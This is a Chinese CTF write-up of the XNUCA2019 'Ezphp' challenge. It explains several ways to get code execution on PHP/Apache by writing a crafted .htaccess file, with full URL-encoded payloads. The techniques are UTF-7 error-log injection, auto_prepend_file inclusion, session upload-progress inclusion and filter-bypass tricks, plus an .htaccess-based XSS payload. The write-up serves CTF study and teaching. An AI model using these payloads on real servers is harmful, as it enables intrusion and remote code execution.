---
title: XNUCA2019-Ezphp
date: 2019-09-23 12:32:04
tags: CTF
---

### 前言

本来投了先知..可惜没被收.

### 官方上的题目的三种解法

题目源码

```php
<?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    include_once("fl3g.php");
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {
        echo "Hacker";
        die();
    }
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nJust one chance");
?>
```

代码逻辑：当每次打开index.php时，先删除当前目录下的所有文件，然后进行文件包含，和传参检验，对filename和content的内容进行检测，最后把传入的内容加上`"\nJust one chance"`，写入文件，.htaccess的文件内容要求还是比较严格的，如果最后一行写入了Just one chance，那么就会直接500了，所以说先要bypass掉这个字符串，才能接着往下做，这里的bypass手法是利用`\`这个字符去转义换行符，类似于shell的拼接方式，可实现字符串的连接，效果如下

![mjnNiF.png](https://s2.ax1x.com/2019/08/30/mjnNiF.png)



成功实现字符连接，通过htaccess实现xss。

现在既然能成功规避掉这个这个字符串也就意味着可以成功控制htaccess的内容了，官方wp给出三种解来通过htaccess去getshell。

#### 第一种预期解

这个解法就比较好的解释的了`include('fl3g.php')`这个地方，因为当时在getshell后其实也没有发现这个include的作用，赛后看到这个预期解才明白。

首先第一步设置如下

```php
php_value error_log /tmp/fl3g.php
php_value error_reporting 32767
php_value include_path "%2bADw?php phpinfo();%2bADs %2bAF8AXw-halt%2bAF8-compiler()%2bADs"
# \
```

首先设置报错信息储存在/tmp/fl3g.php，设置报错级别为32767(报告所有的可能出现的错误)，设置报错路径为不存在的路径，实际是我们的经过utf7编码后的shell语句，用utf7编码的原因是写入error.log的内容会被html编码，这里采用utf7编码即可绕过。

第二步设置

```php
php_value include_path "/tmp"
php_value zend.multibyte 1  //检测文件是否具有Unicode内容
php_value zend.script_encoding "UTF-7"
# \
```

这里新生成的htaccess首先设置了文件包含路径为/tmp，这样我们包含fl3g.php，其实包含的就是/tmp/fl3g.php，并且通过下面两个设置成功进行内容解码，就把我们的shell语句成功包含到index.php了

最终两步payload如下

第一步

```php
?content=php_value error_log /tmp/fl3g.php%0aphp_value error_reporting 32767%0aphp_value include_path "%2bADw?php phpinfo();%2bADs %2bAF8AXw-halt%2bAF8-compiler()%2bADs"%0a%23 \&filename=.htaccess
```

第二步打两次拿可getshell(第一次生成新的配置文件，第二次在配置文件的作用下即可包含shell语句)

```php
?content=php_value include_path "/tmp"%0aphp_value zend.multibyte 1%0aphp_value zend.script_encoding "UTF-7"%0a%23 \&filename=.htaccess
```

![mjJ27j.png](https://s2.ax1x.com/2019/08/30/mjJ27j.png)

#### 第二种解法

这个是rois的解法，rois也发过Write up，我也就不再赘述了。

```php
php_value pcre.backtrack_limit 0
php_value pcre.jit 0
```

原理是通过设置pcre的回溯次数上限为0，导致返回false绕过正则的限制，进而绕过文件名的限制，并php://filter和base64编码来绕过题中对content的参数的限制。

#### 第三种解法

通过在htaccess中写入shell语句，并且设置

```php
php_value auto_prepend_fi\ //通过 \ 来进行字符连接来规避content中的过滤
le ".htaccess"
#<?php phpinfo();?>\
```

通过auto_prepend_file的设置使得index.php对.htaccess的内容进行包含而getshell

最终payload为

```
?filename=.htaccess&content=php_value auto_append_fi\%0ale .htaccess%0a%23<?php phpinfo(); ?>\
```

效果如下

![mjU7GR.png](https://s2.ax1x.com/2019/08/30/mjU7GR.png)



### 对题目的一些思考

首先思考的一些问题是题目通过什么规则限制了通过file_put_contents新建出php文件的解析，和index.php为什么无法覆盖(这个还是比较好解释的，控制权限就行)，为什么通过`AddType application/x-httpd-php .txt`这种规则无法生效。

首先还是看了一下apache的配置文件apache2.conf，下面来说一下主要的几个地方

![mjaxXV.png](https://s2.ax1x.com/2019/08/30/mjaxXV.png)

这是文件中设置的几个规则，在这里 /var/www的规则是不去寻找.htaccess文件，也就是.htaccess是不生效的，所以当时就很奇怪为什么index.php却是受到htaccess的影响的，接下向下翻，反向有两处包含配置文件的地方

![mjdlhd.png](https://s2.ax1x.com/2019/08/30/mjdlhd.png)

那么就接着去这两个目录下翻一翻配置文件吧，最主要的两个文件其实是



conf-available下的docker-php.conf

![mjdh4J.png](https://s2.ax1x.com/2019/08/30/mjdh4J.png)

这个规则的意思是设置了/var/www目录下的文件是受.htaccess文件的影响



sites-enabled下的000-default.conf

![mjw3aF.png](https://s2.ax1x.com/2019/08/30/mjw3aF.png)

这个配置的规则意思是首先关闭的php的解析引擎，再对index.php设置特定的规则，同样设置index.php不受htaccess的影响，并且对index.php开启php的解析引擎。

这里是有多个规则同时作用于/var/www下的文件的，后来问了一下出题的师傅，得知docker-php.conf的优先级要更高一些，所以最终生效的是docker-php.conf的配置规则，所以/var/www目录下是受htaccess影响的。

所以之前的那几个疑惑点也就都弄清了

- php文件只有index.php解析而其他的文件却不解析：是因为php解析引擎关闭，而000-default.conf文件中只对index.php添加了规则使得index.php正常解析。
- AddType application/x-httpd-php .txt这类规则无法生效：同样因为php引擎关闭，无法正常解析

### .htaccess拓展

#### 设置.htaccess实现xss攻击

.htaccess添加内容如下

```php
php_value highlight.comment '"><script>alert(1);</script>'

```

效果如下

![mjDS29.png](https://s2.ax1x.com/2019/08/30/mjDS29.png)

经实验验证以下配置修改都可以实现xss攻击

![mj5DXT.png](https://s2.ax1x.com/2019/08/30/mj5DXT.png)



#### 通过htaccess实现文件包含拿到后门

##### 无对htaccess内容检验时

在htaccess中添加如下内容

```php
php_value auto_append_file .htaccess

#<?php phpinfo();

```

访问任意php文件

![mjsA9e.png](https://s2.ax1x.com/2019/08/30/mjsA9e.png)



##### 有对htaccess内容检验时

如对<?进行检验，我们可以通过utf7编码来绕过

![mjcHKJ.png](https://s2.ax1x.com/2019/08/30/mjcHKJ.png)

#### 通过设置htaccess规则拿到源码

在htaccess添加规则如下，使得php解析引擎关闭，得到文件源码

![mjgHW8.png](https://s2.ax1x.com/2019/08/30/mjgHW8.png)



### 最后的一些思考

看了一些php.ini的东西，感觉是会有第四种做法的,就尝试了一下(其实和前三种差不多

最后看php.ini的信息的时候随手翻了一下，发现如下四个配置，而且发现都可以通过htaccess控制

![mjIr8I.png](https://s2.ax1x.com/2019/08/30/mjIr8I.png)

仔细思考了一下，想到了可以`POST`一个与`session.upload_progress.name`同名的变量，这个变量对应的值就会被记录到`session`文件中，那么我们再去包含这个session，那么也可以getshell的这种做法。

但是这道题没设session，看了一会配置信息，发现上面有一个配置是`session.auto_start`,这个配置的意思相当于自动开启session_start，那么这样就很好办了，首先设置htaccess文件内容如下

```php
php_value session.auto_start 1
php_value session.upload_progress.cleanup 0
php_value session.upload_progress.enabled 1
php_value session.save_path "/tmp"
php_value auto_prepend_file "/tmp/sess_123"

# \

```

对应payload为

```
filename=.htaccess&content=php_value%20sessio%5C%0An.auto_start%201%0Aphp_value%20sessio%5C%0An.up%5C%0Aload_progress.cleanup%200%0Aphp_value%20sessio%5C%0An.uplo%5C%0Aad_progress.enabled%201%0Aphp_value%20sessio%5C%0An.save_path%20%22%2Ftmp%22%0Aphp_value%20auto_prepend_fi%5C%0Ale%20%22%2Ftmp%2Fsess_123%22%0A%23%20%5C

```

第二步通过表单把shell语句加在session文件中

表单如下

```html
<form action="http://4b94737b-7d77-493d-b119-6ab89c8ef450.node1.buuoj.cn" method="post" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" vaule="<?php phpinfo(); ?>" />
    <input type="file" name="file1" />
    <input type="file" name="file2" />
    <input type="submit" />
</form>

```

这里用的buuoj这个平台(很好用,推荐一下)，抓包在burp中加一下PHPSESSID

![mvNlGR.png](https://s2.ax1x.com/2019/08/31/mvNlGR.png)

这时上一次我们的配置就生效的了，添加PHPSESSID后也就直接被包含了，执行了我们的php代码

![mvNjY9.png](https://s2.ax1x.com/2019/08/31/mvNjY9.png)

其实这个解法和前面的原理思路也都是差不多的，只是想记录一下萌新的一些想法。



文章如果不足之处，还请师傅们指出

### 参考链接

http://www.hackdig.com/02/hack-18445.htm

https://www.php.net/manual/zh/configuration.changes.modes.php

https://php.golaravel.com/ini.list.html

https://httpd.apache.org/docs/current/howto/htaccess.html